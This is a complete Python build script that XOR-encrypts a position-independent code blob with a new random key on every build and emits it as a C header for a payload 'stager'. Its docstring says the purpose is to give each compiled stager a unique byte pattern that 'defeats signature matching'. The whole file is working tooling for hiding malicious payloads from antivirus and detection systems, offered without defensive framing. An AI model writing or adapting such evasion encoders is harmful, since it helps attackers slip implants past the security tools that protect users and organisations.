#!/usr/bin/env python3
"""
gen_payload.py — XOR-encrypt a PICO blob and emit a C header.

Each build generates a fresh random 256-byte key so every compiled stager
has a unique byte pattern in its .data section — defeats signature matching.

Usage: gen_payload.py <input.bin> <output.h>
"""
import os, sys

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <input.bin> <output.h>", file=sys.stderr)
    sys.exit(1)

infile, outfile = sys.argv[1], sys.argv[2]

key = os.urandom(256)   # fresh key every build

with open(infile, 'rb') as f:
    raw = f.read()

enc = bytes([b ^ key[i % len(key)] for i, b in enumerate(raw)])

def c_array(name, data, type_='unsigned char'):
    lines = [f'static const {type_} {name}[] = {{']
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        lines.append('    ' + ','.join(f'0x{b:02x}' for b in chunk) + ',')
    lines.append('};')
    return '\n'.join(lines)

with open(outfile, 'w') as f:
    f.write('/* auto-generated — do not edit */\n\n')
    f.write(c_array('pico_key', key))
    f.write(f'\nstatic const unsigned int pico_key_len = {len(key)};\n\n')
    f.write(c_array('pico_payload', enc))
    f.write(f'\nstatic const unsigned int pico_payload_len = {len(enc)};\n')

print(f'[+] pico_payload.h: {len(raw)} bytes encrypted, key_len={len(key)}', file=sys.stderr)
